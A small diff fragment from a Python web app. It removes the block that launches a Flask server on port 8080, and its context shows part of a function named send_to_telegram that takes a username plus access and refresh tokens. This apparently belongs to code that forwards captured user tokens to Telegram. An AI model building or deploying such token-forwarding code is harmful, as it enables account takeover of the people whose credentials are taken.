@@ -128,7 +128,3 @@ def send_to_telegram(username, access_token, refresh_token):
 
   except Exception as e:
     print(f'Error sending message to Telegram: {str(e)}')
-
-
-if __name__ == '__main__':
-   app.run(host='0.0.0.0', port=8080)
